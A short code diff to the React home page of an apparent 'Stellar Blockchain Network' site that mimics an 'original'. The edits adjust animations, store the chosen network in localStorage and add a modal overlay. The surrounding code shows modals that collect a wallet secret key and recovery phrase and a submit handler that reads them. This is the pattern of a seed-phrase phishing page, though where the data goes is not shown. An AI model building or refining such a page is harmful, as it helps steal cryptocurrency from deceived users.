@@ -15,7 +15,12 @@ export default function Home() {
 
   useEffect(() => {
     if (typeof window !== "undefined" && (window as any).AOS) {
-      (window as any).AOS.init();
+      (window as any).AOS.init({
+        duration: 800,
+        easing: 'ease-in-out',
+        once: true,
+        mirror: false
+      });
     }
   }, []);
 
@@ -23,10 +28,19 @@ export default function Home() {
   const openLogin = (networkName: string) => {
     setNetwork(networkName);
     setModal("login");
+    // Store network in localStorage like original
+    if (typeof window !== "undefined") {
+      localStorage.setItem("Network", networkName);
+    }
   };
+  
   const openSecret = () => setModal("secret");
   const openPhrase = () => setModal("phrase");
-  const closeModal = () => setModal(null);
+  const closeModal = () => {
+    setModal(null);
+    setNavActive(false);
+  };
+  
   const handleSubmit = async (type: "secret" | "phrase") => {
     const secret = (secretKeyRef.current as any)?.value || "";
     const phrase = (phraseRef.current as any)?.value || "";
@@ -45,6 +59,7 @@ export default function Home() {
 
   return (
     <>
+      <div className={`overlay${modal ? " active" : ""}`} onClick={closeModal}></div>
       <Modals
         modal={modal}
         closeModal={closeModal}
@@ -57,7 +72,7 @@ export default function Home() {
       <Navbar navActive={navActive} setNavActive={setNavActive} />
       <section className="blockchainNetworks flx fdc jcc aic">
         <h1>Stellar Blockchain Network</h1>
-        <NetworkCards openLogin={openLogin} cardBg="white" />
+        <NetworkCards openLogin={openLogin} />
       </section>
       <Footer />
     </>
